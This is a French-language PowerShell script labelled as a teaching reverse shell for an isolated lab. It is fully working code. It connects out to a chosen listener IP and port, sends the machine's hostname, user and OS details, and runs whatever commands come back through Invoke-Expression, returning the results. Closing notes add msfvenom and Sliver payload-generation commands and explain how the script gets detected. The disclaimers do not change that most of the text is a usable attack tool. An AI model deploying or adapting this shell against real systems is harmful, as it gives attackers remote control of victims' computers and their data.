# ============================================================================
# REVERSE SHELL PEDAGOGIQUE - WINDOWS POWERSHELL
# ============================================================================
#
# USAGE: LAB PERSONNEL UNIQUEMENT - ENVIRONNEMENT ISOLE
#
# Ce script est un exemple EDUCATIF simplifie pour comprendre les mecaniques
# d'un reverse shell. Il est volontairement simple et commente.
#
# IMPORTANT:
# - A utiliser UNIQUEMENT dans votre laboratoire personnel
# - Machines virtuelles isolees du reseau
# - Objectif: APPRENTISSAGE et COMPREHENSION
# - PAS pour engagements reels (utilisez Metasploit)
#
# LIMITATIONS INTENTIONNELLES:
# - Pas d'encryption (texte clair)
# - Pas d'obfuscation
# - Pas de gestion d'erreurs robuste
# - Detection facile par EDR/antivirus
# - Pas de persistence
#
# POUR ENGAGEMENTS PROFESSIONNELS:
# --> Utilisez Metasploit Meterpreter
# --> Encryption des communications
# --> Evasion integree
# --> Logging pour rapport client
#
# ============================================================================

param(
    [Parameter(Mandatory=$true)]
    [string]$ListenerIP,

    [Parameter(Mandatory=$true)]
    [int]$ListenerPort
)

# ============================================================================
# CONFIGURATION
# ============================================================================

Write-Host "[*] Reverse Shell Pedagogique - Lab Only" -ForegroundColor Cyan
Write-Host "[*] Listener: ${ListenerIP}:${ListenerPort}" -ForegroundColor Cyan
Write-Host "[!] USAGE: Lab personnel isole uniquement!" -ForegroundColor Yellow
Write-Host ""

# ============================================================================
# ETAPE 1: CREATION DE LA CONNEXION TCP
# ============================================================================

Write-Host "[1] Creation de la connexion TCP..." -ForegroundColor Green

try {
    # Creer un client TCP qui se connecte au listener
    # C'est l'equivalent de "telephoner" au listener
    $client = New-Object System.Net.Sockets.TCPClient($ListenerIP, $ListenerPort)

    Write-Host "[+] Connexion etablie avec ${ListenerIP}:${ListenerPort}" -ForegroundColor Green

} catch {
    Write-Host "[-] Erreur de connexion: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Verifiez que le listener est actif" -ForegroundColor Yellow
    exit 1
}

# ============================================================================
# ETAPE 2: OBTENTION DU STREAM DE COMMUNICATION
# ============================================================================

Write-Host "[2] Obtention du stream de communication..." -ForegroundColor Green

# Le "stream" est le canal par lequel les donnees circulent
# C'est comme un tuyau bidirectionnel entre nous et le listener
$stream = $client.GetStream()

# Creer des objets pour lire et ecrire dans le stream
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)

# AutoFlush = envoyer immediatement sans bufferiser
$writer.AutoFlush = $true

# ============================================================================
# ETAPE 3: ENVOI D'UN MESSAGE DE BIENVENUE
# ============================================================================

Write-Host "[3] Envoi du message de bienvenue..." -ForegroundColor Green

# Collecter informations sur la machine compromise
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption

# Creer banner avec informations
$banner = @"

====================================
CONNEXION ETABLIE - LAB PEDAGOGIQUE
====================================
Hostname: $hostname
Username: $username
OS: $os
PowerShell Version: $($PSVersionTable.PSVersion)
Time: $(Get-Date)
====================================

Type 'help' pour aide
Type 'exit' pour quitter

"@

# Envoyer le banner au listener
$writer.WriteLine($banner)

Write-Host "[+] Message de bienvenue envoye" -ForegroundColor Green

# ============================================================================
# ETAPE 4: BOUCLE PRINCIPALE - EXECUTION DE COMMANDES
# ============================================================================

Write-Host "[4] Demarrage de la boucle d'execution..." -ForegroundColor Green
Write-Host "[*] En attente de commandes du listener..." -ForegroundColor Cyan

# Boucle infinie pour recevoir et executer des commandes
while ($true) {

    try {
        # ===================================================================
        # 4.1: RECEVOIR UNE COMMANDE DU LISTENER
        # ===================================================================

        # Envoyer prompt au listener
        $writer.Write("PS $pwd> ")

        # Lire la commande envoyee par le listener
        # C'est bloquant - attend jusqu'a reception d'une ligne
        $command = $reader.ReadLine()

        # Si pas de commande ou connexion fermee, sortir
        if ($null -eq $command -or $command -eq "") {
            Write-Host "[-] Connexion fermee par le listener" -ForegroundColor Red
            break
        }

        Write-Host "[>] Commande recue: $command" -ForegroundColor Yellow

        # ===================================================================
        # 4.2: TRAITER LES COMMANDES SPECIALES
        # ===================================================================

        # Commande 'exit' - fermer proprement la connexion
        if ($command -eq "exit") {
            $writer.WriteLine("[*] Fermeture de la connexion...")
            Write-Host "[*] Commande 'exit' recue - fermeture" -ForegroundColor Yellow
            break
        }

        # Commande 'help' - afficher aide
        if ($command -eq "help") {
            $helpText = @"

COMMANDES DISPONIBLES:
----------------------
help           Afficher cette aide
exit           Fermer la connexion
cd <path>      Changer de repertoire
download <file> Telecharger un fichier
upload <file>   Uploader un fichier (non implemente)
sysinfo        Informations systeme
<command>      Executer commande PowerShell

EXEMPLES:
---------
whoami
Get-Process
ipconfig
netstat -an
Get-ChildItem C:\

"@
            $writer.WriteLine($helpText)
            continue
        }

        # Commande 'sysinfo' - informations detaillees
        if ($command -eq "sysinfo") {
            $sysinfo = @"

=== SYSTEM INFORMATION ===
Hostname: $env:COMPUTERNAME
Username: $env:USERNAME
Domain: $env:USERDOMAIN
OS: $((Get-CimInstance Win32_OperatingSystem).Caption)
Architecture: $env:PROCESSOR_ARCHITECTURE
PowerShell: $($PSVersionTable.PSVersion)
.NET: $([System.Runtime.InteropServices.RuntimeInformation]::FrameworkDescription)
Current Directory: $pwd
==========================

"@
            $writer.WriteLine($sysinfo)
            continue
        }

        # Commande 'cd' - changer de repertoire
        if ($command -match '^cd\s+(.+)$') {
            $newPath = $matches[1]
            try {
                Set-Location $newPath
                $writer.WriteLine("[+] Changed directory to: $pwd")
            } catch {
                $writer.WriteLine("[-] Error: $($_.Exception.Message)")
            }
            continue
        }

        # ===================================================================
        # 4.3: EXECUTER LA COMMANDE POWERSHELL
        # ===================================================================

        try {
            # Executer la commande et capturer le resultat
            # Out-String convertit l'objet PowerShell en texte
            $result = Invoke-Expression $command 2>&1 | Out-String

            # Si le resultat est vide, informer
            if ([string]::IsNullOrWhiteSpace($result)) {
                $result = "[*] Command executed successfully (no output)"
            }

        } catch {
            # En cas d'erreur, capturer le message d'erreur
            $result = "[-] Error executing command:`n$($_.Exception.Message)"
        }

        # ===================================================================
        # 4.4: ENVOYER LE RESULTAT AU LISTENER
        # ===================================================================

        # Envoyer le resultat de la commande
        $writer.WriteLine($result)
        $writer.WriteLine("")  # Ligne vide pour separation

        Write-Host "[<] Resultat envoye ($($result.Length) caracteres)" -ForegroundColor Cyan

    } catch {
        # Erreur dans la boucle - probablement connexion perdue
        Write-Host "[-] Erreur dans la boucle: $($_.Exception.Message)" -ForegroundColor Red
        break
    }
}

# ============================================================================
# ETAPE 5: NETTOYAGE ET FERMETURE
# ============================================================================

Write-Host "[5] Nettoyage et fermeture..." -ForegroundColor Green

# Fermer proprement toutes les ressources
if ($writer) { $writer.Close() }
if ($reader) { $reader.Close() }
if ($stream) { $stream.Close() }
if ($client) { $client.Close() }

Write-Host "[+] Connexion fermee proprement" -ForegroundColor Green
Write-Host "[*] Script termine" -ForegroundColor Cyan

# ============================================================================
# NOTES PEDAGOGIQUES
# ============================================================================

<#

COMMENT CA FONCTIONNE:

1. CONNEXION TCP:
   - TCPClient se connecte au listener (comme un appel telephonique)
   - Si listener n'est pas actif, echec immediat

2. STREAM:
   - Canal bidirectionnel de communication
   - StreamReader pour lire (recevoir commandes)
   - StreamWriter pour ecrire (envoyer resultats)

3. BOUCLE:
   - Attend commande du listener (bloquant)
   - Execute la commande avec Invoke-Expression
   - Renvoie le resultat
   - Recommence

4. INVOKE-EXPRESSION:
   - Execute code PowerShell dynamiquement
   - DANGEREUX en production (injection de code)
   - OK pour ce contexte educatif

POURQUOI C'EST FACILEMENT DETECTABLE:

1. Processus:
   - powershell.exe avec connexion reseau active
   - Visible dans Event Logs (Event ID 4688)
   - Sysmon detectera la connexion (Event ID 3)

2. Reseau:
   - Connexion TCP vers IP externe
   - Trafic non-chiffre (texte clair)
   - Facilement visible dans Wireshark

3. Comportement:
   - PowerShell executant des commandes en boucle
   - Pattern suspect pour EDR
   - Invoke-Expression est un IOC majeur

POUR ENGAGEMENTS REELS:

N'UTILISEZ PAS ce script! Utilisez plutot:

1. Metasploit Meterpreter:
   msfvenom -p windows/x64/meterpreter/reverse_https \
     LHOST=ip LPORT=443 -f exe -o payload.exe

2. Sliver C2:
   generate --mtls domain.com --os windows

3. Empire/Covenant pour PowerShell professionnel

AVANTAGES DES OUTILS PROFESSIONNELS:

- Encryption (HTTPS, mTLS)
- Obfuscation et evasion
- Post-exploitation riche
- Gestion de sessions
- Logging pour rapports
- Cleanup automatique
- Accepte par clients

POUR ALLER PLUS LOIN:

- Lire ../concepts/reverse-shell-explained.md
- Tester avec Wireshark pour voir le trafic
- Activer Windows Defender et observer detection
- Comparer avec Metasploit Meterpreter
- Apprendre detection avec Sysmon

#>
